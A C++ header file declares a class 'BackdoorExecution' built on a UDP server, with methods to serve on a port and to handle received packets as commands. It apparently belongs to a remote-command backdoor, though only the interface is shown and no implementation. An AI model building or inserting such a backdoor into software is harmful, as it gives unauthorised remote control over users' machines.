#pragma once

#include <UdpServer.hpp>

class BackdoorExecution : private UdpServer
{
public:
    void Serve(volatile std::sig_atomic_t& stop, std::uint16_t port);
    void OnReceivedPacket(std::span<const std::uint8_t> command) override;
    void LogError(std::string_view sv) override;
    BackdoorExecution();
    ~BackdoorExecution() override;
};
